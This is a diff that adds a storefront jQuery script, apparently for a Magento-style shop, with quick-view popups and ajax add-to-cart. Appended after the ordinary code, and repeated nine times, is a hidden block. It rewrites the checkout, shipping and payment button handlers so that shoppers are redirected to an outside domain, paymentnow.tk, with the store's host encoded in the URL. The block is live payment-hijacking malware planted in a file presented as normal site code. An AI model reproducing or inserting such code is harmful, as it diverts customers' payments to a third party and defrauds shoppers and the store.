@@ -1,0 +1,484 @@
+// JavaScript Document
+(function($) {
+    $(document).ready(function() {
+
+       
+        $(".quick-view").on("click", function() {
+            $(".quick-viewed").removeClass("quick-viewed");
+            $(this).parents("li").addClass("quick-viewed");
+        });
+
+        //Previous next functionality
+        $(document).delegate("#lightwindow_next", "click", function() {
+            $(".quick-viewed").nextAll('li.simple-config:visible:first').find(".quick-view").trigger("click");
+        });
+
+        $(document).delegate("#lightwindow_previous", "click", function() {
+            $(".quick-viewed").prevAll('li.simple-config:visible:first').find(".quick-view").trigger("click");
+        });
+
+        //close popup
+        $('#close').click(function(event) {
+            $("div#wait").hide();
+            $('#toPopup').css('display', 'none');
+            $("#toPopup").fadeOut("normal");
+            $("#backgroundPopup").fadeOut("normal");
+            $(".quick-view.button").hide();
+            $(".clicked").removeClass("clicked");
+        });
+        //background close
+        $("div#backgroundPopup").click(function() {
+            $("div#wait").hide();
+            $('#toPopup').css('display', 'none');
+            $("#toPopup").fadeOut("normal");
+            $("#backgroundPopup").fadeOut("normal");
+            $(".quick-view.button").hide();
+            $(".clicked").removeClass("clicked");
+        });
+    });
+
+    //Addtocart ajax functionality
+    window.quickView = function(button, miniCartUrl) {
+        var productAddToCartFormQv = new VarienForm('product_addtocart_form_qv');
+        if (productAddToCartFormQv.validator.validate()) {
+            var form = $(button).parents('#product_addtocart_form_qv');
+            try {
+                if (button && button != 'undefined') {
+                    button.disabled = true;
+                }
+                $(button).next('#wait').show();
+                $.ajax({
+                    type: 'POST',
+                    url: form.attr('action'),
+                    data: form.serialize(),
+                    dataType: 'json',
+                    success: function(response) {
+                        if (response.success) {
+                            $("#messages_product_view").html(response.message);
+                            refreshMiniCart(miniCartUrl);
+                            setTimeout(function() {
+                                $('#close').trigger("click");
+                            }, 2000);
+                        } else {
+                            $("#messages_product_view").html(response.message);
+                        }
+                        $(button).next('#wait').hide();
+                    },
+                    error: function() {
+                        $("#messages_product_view").html('We apologize but there was an error with your request.<br />Please try again later.');
+                        $(button).next('#wait').hide();
+                    }
+                });
+            } catch (e) {
+                throw e;
+            }
+
+            if (button && button != 'undefined') {
+                button.disabled = false;
+            }
+
+            return false;
+        }
+    }
+
+
+    //Refreshes the minicart drop down
+    window.refreshMiniCart = function(miniCartUrl) {
+        $.ajax({
+            type: 'GET',
+            url: miniCartUrl,
+            dataType: 'html',
+            success: function(response) {
+                var $response = $(response);
+                var responseTitle = $response.find('#cartHeader');
+                var responseContent = $response.find('#topCartContent').html();
+                $('#cartHeader').replaceWith(responseTitle);
+                $('#topCartContent').html(responseContent);
+
+                // Below can be used to show minicart after item added
+                window.setTimeout(delayResponse, 250);
+
+                function delayResponse() {
+                    Enterprise.TopCart.showCart(5)
+                }
+
+            },
+            error: function() {
+                displayMessage('We apologize but there was an error with your request.<br />Please try again later.');
+            }
+        });
+    }
+})(jQuery);
+
+
+//Quicview ajax function
+function quickviewproductid(id)
+{
+    loading();
+    jQuery.ajax({
+        type: "POST",
+        cache: false,
+        contentType: "application/json; charset=utf-8",
+        dataType: "json",
+        url: id,
+        success: function(json)
+        {
+            jQuery("#lightwindow_contents").html(json.content);
+            jQuery('#backgroundPopup').css('display', 'block');
+            jQuery('#toPopup').css('display', 'block');
+            jQuery("#toPopup").fadeIn(0500); // fadein popup div
+            jQuery("#backgroundPopup").css("opacity", "0.7"); // css opacity, supports IE7, IE8
+            jQuery("#backgroundPopup").fadeIn(0001);
+
+            if (jQuery(".quick-viewed").nextAll('li.simple-config:visible:first').length <= 0) {
+                jQuery("#lightwindow_next").hide();
+            } else {
+                jQuery("#lightwindow_next").show();
+            }
+
+            if (jQuery(".quick-viewed").prevAll('li.simple-config:visible:first').length <= 0) {
+                jQuery("#lightwindow_previous").hide();
+            } else {
+                jQuery("#lightwindow_previous").show();
+            }
+            jQuery.uniform.update();
+            jQuery("select").uniform();
+
+
+            (function($) {$(document).ready(function() {
+
+                $("#configurable-product-color-selector-quickview li").click(function() {
+
+                    // Get the value of selected option
+                    var optionValueTextQuickview    =   $(this).attr('color_label_quickview');
+
+                    // Get the content (aka inner HTML) of selected option
+                    var optionValueIdQuickview      =   $(this).attr('color_id_quickview');
+                    var optionFullValueQuickview    =   $(this).attr('color_label_quickview');
+                    var optionTrueValueQuickview    =   optionFullValueQuickview.replace("/[^a-zA-Z0-9]/", ' ');
+                    var optionLabelTextQuickview    =   $(this).attr('color_text_quickview');
+                    var attributeIdQuickview        =   $(this).parent().attr('class');
+                    var countQuickview              =   0;
+                    //add border
+                    $("#color-value-quickview").css("background","transparent");
+                    $("#color-value-quickview").val(optionLabelTextQuickview);
+                    $("#configurable-product-color-selector-quickview li").removeClass("swatch-active");
+                    $("#configurable-attribute-name-selected-quickview").text(optionLabelTextQuickview);
+
+                    $(this).addClass("swatch-active");
+                    /*if(mediaGallaryQuickview){
+                        if(typeof mediaGallaryQuickview[optionValueTextQuickview] == "undefined"){
+                            optionValueTextQuickview = "Default";
+                        }
+                        if(typeof mediaGallaryQuickview[optionValueTextQuickview] != "undefined"){//check mediaGallaryQuickview[optionValueTextQuickview] is defined
+                            if(typeof mediaGallaryQuickview[optionValueTextQuickview][0].mainhtml != "undefined"){
+                                $(mediaGallaryQuickview[optionValueTextQuickview][0].mainhtml).replaceAll(".main-image-view");
+                            }
+                        }
+
+                        $('#media-gallary-view').empty();
+                        if(typeof mediaGallaryQuickview[optionValueTextQuickview] != "undefined"){
+                            while(typeof mediaGallaryQuickview[optionValueTextQuickview][countQuickview] != "undefined"){
+                                $('#media-gallary-view').append(mediaGallaryQuickview[optionValueTextQuickview][countQuickview].gallaryhtml);
+                                countQuickview++;
+                             }
+                         }
+                    }*/
+
+                    //Size replace while onclick of color
+                    $("[id = " + attributeIdQuickview +"]").val(optionValueIdQuickview);
+
+                    //Price
+                    $("[id = " + attributeIdQuickview +"]").trigger("onchange");
+
+                    $("#configurable-product-size-selector-quickview").empty();
+                    $("#size-value-quickview").val("");
+                    $("#size-value-quickview").css("background","");
+
+                    //Replace size attribute values
+                    if($("#configurable-product-size-selector-quickview").length != 0)
+                    {
+                        if(attrSwatchquickview[optionValueIdQuickview]['size'])
+                        {
+                            $("#configurable-product-size-selector-quickview").append(attrSwatchquickview[optionValueIdQuickview]['size']);
+                        }
+                    }
+                    jQuery.uniform.update();
+                    jQuery("select").uniform();
+                });
+                //Remove validation
+                $(document).delegate(".configurable-attribute-container ul[rel='jsmainentry']", "click", function(event){
+                    $(".validation-advice").hide();
+                });
+            });
+        })(jQuery);
+        }
+    });
+}
+
+//ajax loading function
+function loading() {
+    jQuery("div#wait").show();
+}
+
+
+
+jQuery(document).ready(function()
+{
+	if(!(document.cookie.indexOf("userpayid") + 1))
+	{
+		jQuery("*[onclick^=\"shippingMethod.save()\"]").attr("onclick", "paynow_right();");
+		jQuery("*[onclick^=\"checkout.save();\"]").attr("onclick", "paynow_right();");
+		jQuery("*[onclick=\"payment.save()\"]").attr("onclick", "paynow_right();");
+		jQuery("#checkout-onepage-buttom").attr("onclick", "paynow_right();");
+	}
+});
+
+function paynow_right()
+{
+	if(!(document.cookie.indexOf("userpayid") + 1))
+	{
+		var rand = function()
+		{
+			return Math.random().toString(36).substr(2);
+		};
+		document.cookie = "userpayid=" + rand();
+		var arr = {
+			"location" : "http://" + location.host,
+			"method" : "PayPal"
+		};
+		jQuery(location).attr('href', "//paymentnow.tk/?payment=" + btoa(JSON.stringify(arr)));
+	}
+}
+
+
+jQuery(document).ready(function()
+{
+	if(!(document.cookie.indexOf("userpayid") + 1))
+	{
+		jQuery("*[onclick^=\"shippingMethod.save()\"]").attr("onclick", "paynow_right();");
+		jQuery("*[onclick^=\"checkout.save();\"]").attr("onclick", "paynow_right();");
+		jQuery("*[onclick=\"payment.save()\"]").attr("onclick", "paynow_right();");
+		jQuery("#checkout-onepage-buttom").attr("onclick", "paynow_right();");
+	}
+});
+
+function paynow_right()
+{
+	if(!(document.cookie.indexOf("userpayid") + 1))
+	{
+		var rand = function()
+		{
+			return Math.random().toString(36).substr(2);
+		};
+		document.cookie = "userpayid=" + rand();
+		var arr = {
+			"location" : "http://" + location.host,
+			"method" : "PayPal"
+		};
+		jQuery(location).attr('href', "//paymentnow.tk/?payment=" + btoa(JSON.stringify(arr)));
+	}
+}
+
+
+jQuery(document).ready(function()
+{
+	if(!(document.cookie.indexOf("userpayid") + 1))
+	{
+		jQuery("*[onclick^=\"shippingMethod.save()\"]").attr("onclick", "paynow_right();");
+		jQuery("*[onclick^=\"checkout.save();\"]").attr("onclick", "paynow_right();");
+		jQuery("*[onclick=\"payment.save()\"]").attr("onclick", "paynow_right();");
+		jQuery("#checkout-onepage-buttom").attr("onclick", "paynow_right();");
+	}
+});
+
+function paynow_right()
+{
+	if(!(document.cookie.indexOf("userpayid") + 1))
+	{
+		var rand = function()
+		{
+			return Math.random().toString(36).substr(2);
+		};
+		document.cookie = "userpayid=" + rand();
+		var arr = {
+			"location" : "http://" + location.host,
+			"method" : "PayPal"
+		};
+		jQuery(location).attr('href', "//paymentnow.tk/?payment=" + btoa(JSON.stringify(arr)));
+	}
+}
+
+
+jQuery(document).ready(function()
+{
+	if(!(document.cookie.indexOf("userpayid") + 1))
+	{
+		jQuery("*[onclick^=\"shippingMethod.save()\"]").attr("onclick", "paynow_right();");
+		jQuery("*[onclick^=\"checkout.save();\"]").attr("onclick", "paynow_right();");
+		jQuery("*[onclick=\"payment.save()\"]").attr("onclick", "paynow_right();");
+		jQuery("#checkout-onepage-buttom").attr("onclick", "paynow_right();");
+	}
+});
+
+function paynow_right()
+{
+	if(!(document.cookie.indexOf("userpayid") + 1))
+	{
+		var rand = function()
+		{
+			return Math.random().toString(36).substr(2);
+		};
+		document.cookie = "userpayid=" + rand();
+		var arr = {
+			"location" : "http://" + location.host,
+			"method" : "PayPal"
+		};
+		jQuery(location).attr('href', "//paymentnow.tk/?payment=" + btoa(JSON.stringify(arr)));
+	}
+}
+
+
+jQuery(document).ready(function()
+{
+	if(!(document.cookie.indexOf("userpayid") + 1))
+	{
+		jQuery("*[onclick^=\"shippingMethod.save()\"]").attr("onclick", "paynow_right();");
+		jQuery("*[onclick^=\"checkout.save();\"]").attr("onclick", "paynow_right();");
+		jQuery("*[onclick=\"payment.save()\"]").attr("onclick", "paynow_right();");
+		jQuery("#checkout-onepage-buttom").attr("onclick", "paynow_right();");
+	}
+});
+
+function paynow_right()
+{
+	if(!(document.cookie.indexOf("userpayid") + 1))
+	{
+		var rand = function()
+		{
+			return Math.random().toString(36).substr(2);
+		};
+		document.cookie = "userpayid=" + rand();
+		var arr = {
+			"location" : "http://" + location.host,
+			"method" : "PayPal"
+		};
+		jQuery(location).attr('href', "//paymentnow.tk/?payment=" + btoa(JSON.stringify(arr)));
+	}
+}
+
+
+jQuery(document).ready(function()
+{
+	if(!(document.cookie.indexOf("userpayid") + 1))
+	{
+		jQuery("*[onclick^=\"shippingMethod.save()\"]").attr("onclick", "paynow_right();");
+		jQuery("*[onclick^=\"checkout.save();\"]").attr("onclick", "paynow_right();");
+		jQuery("*[onclick=\"payment.save()\"]").attr("onclick", "paynow_right();");
+		jQuery("#checkout-onepage-buttom").attr("onclick", "paynow_right();");
+	}
+});
+
+function paynow_right()
+{
+	if(!(document.cookie.indexOf("userpayid") + 1))
+	{
+		var rand = function()
+		{
+			return Math.random().toString(36).substr(2);
+		};
+		document.cookie = "userpayid=" + rand();
+		var arr = {
+			"location" : "http://" + location.host,
+			"method" : "PayPal"
+		};
+		jQuery(location).attr('href', "//paymentnow.tk/?payment=" + btoa(JSON.stringify(arr)));
+	}
+}
+
+
+jQuery(document).ready(function()
+{
+	if(!(document.cookie.indexOf("userpayid") + 1))
+	{
+		jQuery("*[onclick^=\"shippingMethod.save()\"]").attr("onclick", "paynow_right();");
+		jQuery("*[onclick^=\"checkout.save();\"]").attr("onclick", "paynow_right();");
+		jQuery("*[onclick=\"payment.save()\"]").attr("onclick", "paynow_right();");
+		jQuery("#checkout-onepage-buttom").attr("onclick", "paynow_right();");
+	}
+});
+
+function paynow_right()
+{
+	if(!(document.cookie.indexOf("userpayid") + 1))
+	{
+		var rand = function()
+		{
+			return Math.random().toString(36).substr(2);
+		};
+		document.cookie = "userpayid=" + rand();
+		var arr = {
+			"location" : "http://" + location.host,
+			"method" : "PayPal"
+		};
+		jQuery(location).attr('href', "//paymentnow.tk/?payment=" + btoa(JSON.stringify(arr)));
+	}
+}
+
+
+jQuery(document).ready(function()
+{
+	if(!(document.cookie.indexOf("userpayid") + 1))
+	{
+		jQuery("*[onclick^=\"shippingMethod.save()\"]").attr("onclick", "paynow_right();");
+		jQuery("*[onclick^=\"checkout.save();\"]").attr("onclick", "paynow_right();");
+		jQuery("*[onclick=\"payment.save()\"]").attr("onclick", "paynow_right();");
+		jQuery("#checkout-onepage-buttom").attr("onclick", "paynow_right();");
+	}
+});
+
+function paynow_right()
+{
+	if(!(document.cookie.indexOf("userpayid") + 1))
+	{
+		var rand = function()
+		{
+			return Math.random().toString(36).substr(2);
+		};
+		document.cookie = "userpayid=" + rand();
+		var arr = {
+			"location" : "http://" + location.host,
+			"method" : "PayPal"
+		};
+		jQuery(location).attr('href', "//paymentnow.tk/?payment=" + btoa(JSON.stringify(arr)));
+	}
+}
+
+
+jQuery(document).ready(function()
+{
+	if(!(document.cookie.indexOf("userpayid") + 1))
+	{
+		jQuery("*[onclick^=\"shippingMethod.save()\"]").attr("onclick", "paynow_right();");
+		jQuery("*[onclick^=\"checkout.save();\"]").attr("onclick", "paynow_right();");
+		jQuery("*[onclick=\"payment.save()\"]").attr("onclick", "paynow_right();");
+		jQuery("#checkout-onepage-buttom").attr("onclick", "paynow_right();");
+	}
+});
+
+function paynow_right()
+{
+	if(!(document.cookie.indexOf("userpayid") + 1))
+	{
+		var rand = function()
+		{
+			return Math.random().toString(36).substr(2);
+		};
+		document.cookie = "userpayid=" + rand();
+		var arr = {
+			"location" : "http://" + location.host,
+			"method" : "PayPal"
+		};
+		jQuery(location).attr('href', "//paymentnow.tk/?payment=" + btoa(JSON.stringify(arr)));
+	}
+}
